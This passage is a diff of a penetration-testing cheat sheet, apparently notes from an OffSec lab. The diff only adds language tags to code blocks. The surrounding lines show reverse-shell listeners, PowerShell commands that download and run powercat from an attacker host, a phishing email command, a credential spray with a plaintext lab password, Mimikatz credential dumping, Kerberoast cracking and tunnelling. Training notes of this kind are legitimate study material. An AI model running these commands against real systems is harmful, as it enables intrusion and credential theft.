@@ -86,7 +86,7 @@ Annotate payload hashes and detections encountered.
 
 ### Operator Quality of Life
 
-```
+```bash
 nc -nvlp 4444
 Start-Process -NoNewWindow .\metrtcp.exe
 ```
@@ -113,7 +113,7 @@ Keep this sheet close, annotate it as you learn, and fold discoveries back into 
 ### Pentest Methodology
 
 Port scanning
-```
+```bash
 sudo nmap -sC -sV -oN $TARGET/nmap $TARGET_IP
 ```
 
@@ -200,7 +200,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$
 ```
 
 Netcat listener
-```
+```bash
 nc -nvlp 4444
 ```
 
@@ -218,7 +218,7 @@ John
     - *In a real assessment we should also use passive information gathering techniques to obtain more information about a potential target. Based on this information, we could create more tailored emails and improve our chances of success tremendously.*.
 
 Build command
-```
+```bash
 sudo swaks -t $VALID_RECIPIENT_0 -t $VALID_RECIPIENT_1 --from $VALID_EMAIL_ADDRESS --attach @config.Library-ms --server $MAIL_SRV_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
@@ -239,7 +239,7 @@ nc -lp 4445 > bloodhound.zip
 ```
 
 Start `neo4j`, `bloodhound`, and "upload data"
-```
+```bash
 sudo neo4j start
 bloodhound &
 ```
@@ -288,20 +288,20 @@ socks5          127.0.0.1 1080
 
 **SMB Credential Spray Internal Network via Proxy**
 Example:
-```
+```bash
 sudo proxychains -q crackmapexec smb 172.16.87.240-241 172.16.87.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
 ```
 
 **Nmap Internal Network via Proxy**
 Example:
-```
+```bash
 sudo proxychains -q nmap -sT -oN internal-servers.nmap -Pn -p 21,80,443 172.16.87.240 172.16.87.241 172.16.87.254
 ```
 
 **Chisel Proxy Connections**
 [Chisel](https://github.com/jpillora/chisel)
 
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ gunzip chisel_1.9.0_linux_amd64.gz
 
@@ -337,7 +337,7 @@ chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
 ```
 - Bind INTERNALSRV1 port 80 to Kali port 80.
     - *NOTE: kill wsgidav server first*.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ ./chisel server --port 8080 --reverse
 2023/12/30 14:03:01 server: Reverse tunnelling enabled
@@ -348,7 +348,7 @@ chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
 - With chisel connected wr can browse to port 80 on 172.16.87.241 via port 81 of Kali localhost with Firefox.
 
 **Mimikatz Cached Creds**
-```
+```bash
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 ```
@@ -379,7 +379,7 @@ $krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$c1939af6eee8a400b1ec41e96289
 ```
 
 Store the hash to `daniela.hash` an crack with Hashcat.
-```
+```bash
 sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
 ```
 
@@ -444,7 +444,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 ```
 
 Next we need a Netcat listener to catch the reverse shell.
-```
+```bash
 ┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 9999
 listening on [any] 9999 ...
@@ -470,7 +470,7 @@ Set the path to the URI reference `//192.168.45.163/test` where the IP is our Ka
     - Auth to MAILSRV1 succeeds, indicating the same password is used on both local admin accounts.
 
 The realyed command was executed on MAILSRV1, our Netcat listener caught a shell!
-```
+```bash
 ┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 9999
 listening on [any] 9999 ...
@@ -507,7 +507,7 @@ https://nmap.org/ncat/guide/index.html
 ##### Web Servers
 
 Always start with Nmap...
-```
+```bash
 sudo nmap -v -O -sV -p 1-65535 192.168.X.X
 ```
 - Check out service versions with `searchsploit`
@@ -516,7 +516,7 @@ sudo nmap -v -O -sV -p 1-65535 192.168.X.X
 - Search scripts with `nmap --script-help "*" | less`
  - Follow up with `--script` scans on relevant services.
 And then Gobuster *(Especially helpful for IIS servers)*.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/]
 └─$ gobuster dir -x .pdf,.txt,.php -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url http://192.168.206.199
 ```
@@ -530,7 +530,7 @@ And then Gobuster *(Especially helpful for IIS servers)*.
 ##### Base64
 
 ###### Bash
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec]
 └─$ echo -n "test@supermagicorg.com" | base64
 dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==
@@ -548,7 +548,7 @@ Password:
 ```
 
 ###### NodeJS
- ```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/]
 └─$ nodejs
 Welcome to Node.js v18.13.0.
@@ -612,7 +612,7 @@ Type ".help" for more information.
 *See Appendix A.1 for Bash script example*
 
 ###### Read Mail
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec]
 └─$ telnet 192.168.206.199 110
 Trying 192.168.206.199...
@@ -655,7 +655,7 @@ retr 1
 ##### Linux
 
 ###### Netcat
-```
+```bash
 nc -nvlp 4444
 ```
 
@@ -745,7 +745,7 @@ meterpreter > migrate 5256
 ##### Linux
 
 ###### URL Encode with CURL
-```
+```bash
 curl \
     --data-urlencode "paramName=value" \
     --data-urlencode "secondParam=value" \
@@ -799,7 +799,7 @@ find /path/to/search -name 'file.txt'
 ```
 
 ###### Recieve file transfer via Ncat listener *(Windows A.1)*
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/client-side]
 └─$ nc -nvlp 4444 > outfile.txt
 ```
@@ -812,7 +812,7 @@ host1$ ncat --send-only host2 < inputfile
 ```
 
 ###### Send a File Transfer
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/client-side]
 └─$ ncat 192.168.212.196 4445 < mymacro.doc
 ```
@@ -851,12 +851,12 @@ Mode                 LastWriteTime         Length Name
 	- Silence errors and cont exec with `-ErrorAction` set to `SilentlyContinue`
 
 ###### MD5 Sum in PowerShell
-```
+```powershell
 PS C:\Users\offsec> Get-FileHash .\Desktop\file.txt -Algorithm MD5
 ```
 
 ###### Network file transfer to Ncat listener with powercat.ps1 loaded via network *(Linux A.1)*
-```
+```powershell
 PS C:\Users\offsec> IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.223/powercat.ps1');powercat -c 192.168.45.223 -p 4444 -i .\Desktop\infile.txt -v
 
 PS C:\Users\offsec> IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.223/powercat.ps1');powercat -l -p 4444 -of C:\file.txt -v
@@ -870,13 +870,13 @@ PS C:\Users\offsec> IEX(New-Object System.Net.WebClient).DownloadString('http://
 
 ###### WebDAV
 Install `wsgidav` from `apt` or `pip`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/]
 └─$ wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ~/webdav
 ```
 
 ###### HTTP
-```
+```bash
 ┌──(operator㉿labhost)-[~/]
 └─$ python -m http.server -d path/to/serve 8080 
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
